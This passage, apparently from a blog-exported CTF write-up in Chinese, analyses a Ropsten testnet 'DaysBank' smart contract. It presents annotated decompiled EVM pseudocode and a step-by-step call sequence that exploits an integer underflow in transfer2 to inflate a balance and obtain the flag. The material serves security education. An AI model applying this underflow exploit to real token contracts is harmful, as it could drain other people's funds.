class=\"keyword\">return</span> storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">transfer2</span>(<span class=\"params\">var arg0, var arg1</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 转的钱要大于等于3</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (arg1 &lt;= <span class=\"number\">0x02</span>) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\">// balanceOf</span></span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        <span class=\"comment\">// balanceOf 要大于等于3</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">0x02</span> &gt;= storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])]) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// require(balanceOf[address] - data &gt; 0)</span></span><br><span class=\"line\">        <span class=\"comment\">// _sissel_ 整数溢出 uint256</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])] - arg1 &lt;= <span class=\"number\">0x00</span>) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp0 = keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp1 = arg1;</span><br><span class=\"line\">        <span class=\"comment\">// 自己的账户 - temp1</span></span><br><span class=\"line\">        storage[temp0] = storage[temp0] - temp1;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = arg0 &amp; <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 别人的账户 + temp1</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp2 = keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>]);</span><br><span class=\"line\">        storage[temp2] = temp1 + storage[temp2];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">transfer</span>(<span class=\"params\">var arg0, var arg1</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 转的钱要大于等于2，profit()后的状态正好满足</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (arg1 &lt;= <span class=\"number\">0x01</span>) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        <span class=\"comment\">// balanceOf 要大于等于2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">0x01</span> &gt;= storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])]) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// 贼安全，哈哈</span></span><br><span class=\"line\">        <span class=\"comment\">// require(balanceof[address]&gt;=arg1)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (arg1 &gt; storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])]) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp0 = keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp1 = arg1;</span><br><span class=\"line\">        storage[temp0] = storage[temp0] - temp1;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = arg0 &amp; <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp2 = keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>]);</span><br><span class=\"line\">        storage[temp2] = temp1 + storage[temp2];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func_0417</span>(<span class=\"params\">var arg0</span>) <span class=\"title\">returns</span> (<span class=\"params\">var arg0</span>) </span>&#123;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = arg0;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>因为合约比较简单，大家去找几个bank合约对照一下就看懂了。先多看智能合约，再来看逆向，会简单很多。</p>\n<h3 id=\"攻击过程\"><a href=\"#攻击过程\" class=\"headerlink\" title=\"攻击过程\"></a>攻击过程</h3><ul>\n<li>我们最终需要balance很大，那就需要用transfer2构造一个整数溢出。</li>\n<li>transfer2需要账户余额大于等于3。</li>\n<li>init可以让账户变为1，profit可以让账户由1变2。</li>\n<li>transfer 没有溢出，但只需要balance大于等于2就可以用。</li>\n</ul>\n<ol>\n<li>账号1 init() 注意：这个函数的名字不知道，要用四字节码调用。</li>\n<li>账号1 profit()</li>\n<li>账号2 init() 注意：同1</li>\n<li>账号2 profit()</li>\n<li>账号1 transfer(账户2,2)</li>\n<li>账号2 transfer2(账户3, 2**256-1) 给账户3，此函数有下溢</li>\n<li>目标账户 getflag()</li>\n</ol>\n<p>以四字节码调用合约，可以用python发包，或者写攻击合约代发，或者找一些钱包，支持修改data字段的都行。看攻击过程的话，可以看f61d的师傅的，是event里第四个地址【前三个是我。。当时收不到邮件，试了好半天，我当时是用攻击合约写的，不太清晰】。</p>\n","site":{"data":{}},"excerpt":"<p>国赛第二天的区块链题目，因为很多人想要wp，就写了一份完整些的。</p>","more":"<h2 id=\"Author\"><a href=\"#Author\" class=\"headerlink\" title=\"Author\"></a>Author</h2><p>天枢Dubhe Sissel</p>\n<h2 id=\"Init\"><a href=\"#Init\" class=\"headerlink\" title=\"Init\"></a>Init</h2><p>看最后发flag的邮箱是FlappyPig的大师傅出的题，厉害了。前两天参加别的比赛的时候，也逆了个合约，正好国赛用上了，可喜可贺。都是以前首席教我教的好，逃。</p>\n<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>Ropsten, 0x455541c3e9179a6cd8c418142855d894e11a288c</p>\n<p>又给了变量名和<code>payforflag</code>的函数【太棒了，不然逆这个我可看不懂】<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract DaysBank &#123;</span><br><span class=\"line\">    mapping(<span class=\"function\"><span class=\"params\">address</span> =&gt;</span> uint) public balanceOf;</span><br><span class=\"line\">    mapping(<span class=\"function\"><span class=\"params\">address</span> =&gt;</span> uint) public gift;</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>()public&#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    event SendFlag(uint256 flagnum, string b64email);</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">payforflag</span>(<span class=\"params\">string b64email</span>) <span class=\"title\">public</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">require</span>(balanceOf[msg.sender] &gt;= <span class=\"number\">10000</span>);</span><br><span class=\"line\">        emit SendFlag(<span class=\"number\">1</span>,b64email);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"解题过程\"><a href=\"#解题过程\" class=\"headerlink\" title=\"解题过程\"></a>解题过程</h2><p>首先访问ropsten这个合约的地址，发现没有个源代码，遂要对合约逆向。这个工具超好用：<a href=\"https://ethervm.io/decompile\" target=\"_blank\" rel=\"noopener\">https://ethervm.io/decompile</a> 。可以逆出来很好看的伪代码。我不怎么会re，所以下面的一些注释都是个人理解，有不对的地方望大佬们指正。</p>\n<h3 id=\"逆向结果和注释\"><a href=\"#逆向结果和注释\" class=\"headerlink\" title=\"逆向结果和注释\"></a>逆向结果和注释</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Public Methods</span><br><span class=\"line\">Method names cached <span class=\"keyword\">from</span> <span class=\"number\">4</span>byte.directory.</span><br><span class=\"line\"><span class=\"number\">0x652e9d91</span> Unknown</span><br><span class=\"line\"><span class=\"number\">0x66d16cc3</span> profit()</span><br><span class=\"line\"><span class=\"number\">0x6bc344bc</span> Unknown</span><br><span class=\"line\"><span class=\"number\">0x70a08231</span> balanceOf(address)</span><br><span class=\"line\"><span class=\"number\">0x7ce7c990</span> transfer2(address,uint256)</span><br><span class=\"line\"><span class=\"number\">0xa9059cbb</span> transfer(address,uint256)</span><br><span class=\"line\"><span class=\"number\">0xcbfc4bce</span> Unknown</span><br></pre></td></tr></table></figure>\n<p>上面有三个Unknown，分别是以下三个。</p>\n<ul>\n<li>Init第一次薅羊毛</li>\n<li>giftOf 得到用户的gift的值</li>\n<li>sendFlag，得到flag的函数</li>\n</ul>\n<p>理解这些，会更好的看懂下面的代码</p>\n<blockquote>\n<p>00-20 放地址，20-40放0x01的时候，用storage访问，求的是gift的值<br>即 storage[keccak256(memory[0x00:0x40])] = storage[keccak256( 地址+0x01 )] 是gift[address]<br>00-20 放地址，20-40放0x00的时候，用storage访问，求的是balance的值<br>即 storage[keccak256(memory[0x00:0x40])] = storage[keccak256( 地址+0x00 )] 是balance[address]</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Contract &#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">main</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 没用上</span></span><br><span class=\"line\">        memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>] = <span class=\"number\">0x80</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// 根据tx的data字段，判断执行什么函数</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (msg.data.length &lt; <span class=\"number\">0x04</span>) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">var</span> var0 = msg.data[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] / <span class=\"number\">0x0100000000000000000000000000000000000000000000000000000000</span> &amp; <span class=\"number\">0xffffffff</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0x652e9d91</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for 0x652e9d91 (unknown)</span></span><br><span class=\"line\">            <span class=\"comment\">// 薅羊毛，类似于 Init()，让新用户的balanceOf和gift都变为1</span></span><br><span class=\"line\">            <span class=\"keyword\">var</span> var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            var1 = <span class=\"number\">0x009c</span>;</span><br><span class=\"line\">            func_01DC();</span><br><span class=\"line\">            stop();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0x66d16cc3</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for profit()</span></span><br><span class=\"line\">            <span class=\"comment\">// profit() 薅羊毛第二步，让balanceOf为1和gift为1的账户，都变为2.</span></span><br><span class=\"line\">            var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"comment\">// 非payable</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            var1 = <span class=\"number\">0x009c</span>;</span><br><span class=\"line\">            profit();</span><br><span class=\"line\">            stop();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0x6bc344bc</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for 0x6bc344bc (unknown)</span></span><br><span class=\"line\">            <span class=\"comment\">// payforflag() 最后获得flag的函数，不用逆</span></span><br><span class=\"line\">            var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp0 = memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>];</span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp1 = msg.data[<span class=\"number\">0x04</span>:<span class=\"number\">0x24</span>];</span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp2 = msg.data[temp1 + <span class=\"number\">0x04</span>:temp1 + <span class=\"number\">0x04</span> + <span class=\"number\">0x20</span>];</span><br><span class=\"line\">            memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>] = temp0 + (temp2 + <span class=\"number\">0x1f</span>) / <span class=\"number\">0x20</span> * <span class=\"number\">0x20</span> + <span class=\"number\">0x20</span>;</span><br><span class=\"line\">            memory[temp0:temp0 + <span class=\"number\">0x20</span>] = temp2;</span><br><span class=\"line\">            var1 = <span class=\"number\">0x009c</span>;</span><br><span class=\"line\">            memory[temp0 + <span class=\"number\">0x20</span>:temp0 + <span class=\"number\">0x20</span> + temp2] = msg.data[temp1 + <span class=\"number\">0x24</span>:temp1 + <span class=\"number\">0x24</span> + temp2];</span><br><span class=\"line\">            <span class=\"keyword\">var</span> var2 = temp0;</span><br><span class=\"line\">            func_0278(var2);</span><br><span class=\"line\">            stop();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0x70a08231</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for balanceOf(address)</span></span><br><span class=\"line\">            <span class=\"comment\">// balanceOf() 获得用户余额</span></span><br><span class=\"line\">            var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            var1 = <span class=\"number\">0x013a</span>;</span><br><span class=\"line\">            var2 = msg.data[<span class=\"number\">0x04</span>:<span class=\"number\">0x24</span>] &amp; <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class=\"line\">            var2 = balanceOf(var2);</span><br><span class=\"line\">        </span><br><span class=\"line\">        label_013A:</span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp3 = memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>];</span><br><span class=\"line\">            memory[temp3:temp3 + <span class=\"number\">0x20</span>] = var2;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp4 = memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>];</span><br><span class=\"line\">            <span class=\"keyword\">return</span> memory[temp4:temp4 + temp3 - temp4 + <span class=\"number\">0x20</span>];</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0x7ce7c990</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for transfer2(address,uint256)</span></span><br><span class=\"line\">            <span class=\"comment\">// transfer2() 要求用户的balance大于等于3时可以用的转账，有整数溢出漏洞</span></span><br><span class=\"line\">            var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            var1 = <span class=\"number\">0x009c</span>;</span><br><span class=\"line\">            var2 = msg.data[<span class=\"number\">0x04</span>:<span class=\"number\">0x24</span>] &amp; <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> var3 = msg.data[<span class=\"number\">0x24</span>:<span class=\"number\">0x44</span>];</span><br><span class=\"line\">            transfer2(var2, var3);</span><br><span class=\"line\">            stop();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0xa9059cbb</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for transfer(address,uint256)</span></span><br><span class=\"line\">            <span class=\"comment\">// transfer() 没有漏洞的transfer() 但要求balance大于2</span></span><br><span class=\"line\">            var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            var1 = <span class=\"number\">0x009c</span>;</span><br><span class=\"line\">            var2 = msg.data[<span class=\"number\">0x04</span>:<span class=\"number\">0x24</span>] &amp; <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class=\"line\">            var3 = msg.data[<span class=\"number\">0x24</span>:<span class=\"number\">0x44</span>];</span><br><span class=\"line\">            transfer(var2, var3);</span><br><span class=\"line\">            stop();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (var0 == <span class=\"number\">0xcbfc4bce</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Dispatch table entry for 0xcbfc4bce (unknown)</span></span><br><span class=\"line\">            <span class=\"comment\">// 好像是返回用户的 gift值 就是map publice gift。这个变量</span></span><br><span class=\"line\">            var1 = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var1) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            var1 = <span class=\"number\">0x013a</span>;</span><br><span class=\"line\">            var2 = msg.data[<span class=\"number\">0x04</span>:<span class=\"number\">0x24</span>] &amp; <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class=\"line\">            var2 = func_0417(var2);</span><br><span class=\"line\">            goto label_013A;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// init</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func_01DC</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// 